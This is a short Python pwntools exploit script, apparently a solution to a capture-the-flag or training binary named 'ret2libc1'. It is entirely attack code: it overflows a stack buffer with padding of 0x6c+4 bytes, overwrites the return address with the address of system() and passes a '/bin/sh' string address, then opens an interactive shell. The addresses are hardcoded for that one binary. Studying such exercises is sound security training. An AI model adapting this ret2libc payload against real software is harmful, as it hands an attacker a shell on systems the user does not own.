#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

system_addr = 0x08048460
bin_sh_addr = 0x08048720
offset = 0x6c+4

payload = b'A'*offset+p32(system_addr)+p32(0xcccccccc)+p32(bin_sh_addr)

sh.sendline(payload)
sh.interactive()
